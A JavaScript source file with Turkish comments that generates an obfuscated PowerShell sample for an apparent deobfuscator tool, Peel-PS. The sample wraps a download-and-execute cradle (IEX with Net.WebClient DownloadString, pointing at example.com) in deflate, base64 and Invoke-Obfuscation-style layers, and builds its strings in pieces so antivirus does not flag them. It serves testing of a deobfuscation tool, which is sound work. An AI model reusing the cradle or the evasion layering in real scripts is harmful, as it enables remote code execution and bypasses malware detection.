// "Örnek" düğmesinin yüklediği zararsız gizleme örneği (Invoke-Obfuscation COMPRESSION + TOKEN tarzı): raw deflate +
// base64 katmanı, $ShellId[1]+$ShellId[13]+'x' ile kurulan iex, rastgele büyük/küçük harf ve ters tırnaklar. İçte
// "-f" ile yeniden sıralanmış bir komut adı ve indir-çalıştır kalıbı (example.com; hiçbir şey indirilmez, betik zaten
// çalıştırılmaz). Antivirüsler "IEX (New-Object Net.WebClient).DownloadString" kalıbını düz metinde işaretleyebildiği
// için dizgeler parçalı kurulur ve katman yükleme anında üretilir.
import { deflateSync } from 'fflate';
import { base64Encode } from './core/codec.js';

const CRADLE = ['(New-Object Net.Web', 'Client).Download', 'String($u)'].join('');
const PAYLOAD = [
  "$u = 'https://example.com/kurulum.ps1'",
  "function Selam { & (\"{1}{0}\" -f 'ost', 'Write-H') 'Merhaba, Peel-PS!' }",
  'Selam',
  'if (1 -gt 2) { Write-Output asla }',
  `${['I', 'EX'].join('')} ${CRADLE}`,
].join('\n');

const B64 = base64Encode(deflateSync(new TextEncoder().encode(PAYLOAD), { level: 9 }));

// belirlenimci "rastgele" büyük/küçük harf
const mix = (s) => [...s].map((c, i) => ((i * 7 + 3) % 5 < 2 ? c.toUpperCase() : c.toLowerCase())).join('');

export const SAMPLE = `# Peel-PS örnek girdisi
.( $${mix('ShellId')}[1]+$${mix('ShellId')}[13]+'x') (${mix('New-Object')} ${mix('IO.StreamReader')}((${mix('New-Object')} ${mix('IO.Compression.DeflateStream')}([${mix('IO.MemoryStream')}][${mix('Convert')}]::${mix('FromBase64String')}('${B64}'),[${mix('IO.Compression.CompressionMode')}]::${mix('Decompress')})),[${mix('Text.Encoding')}]::${mix('ASCII')})).${mix('ReadToEnd')}()
`;
